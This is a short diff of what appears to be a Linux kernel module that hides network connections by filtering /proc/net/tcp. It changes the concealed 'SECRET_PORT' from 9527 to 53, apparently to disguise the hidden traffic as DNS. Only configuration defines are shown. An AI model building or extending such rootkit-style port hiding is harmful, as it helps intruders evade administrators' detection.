@@ -32,7 +32,7 @@ MODULE_LICENSE("GPL");
 
 # define NET_ENTRY "/proc/net/tcp"
 # define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
-# define SECRET_PORT 9527
+# define SECRET_PORT 53
 # define NEEDLE_LEN 6
 # define TMPSZ 150
 
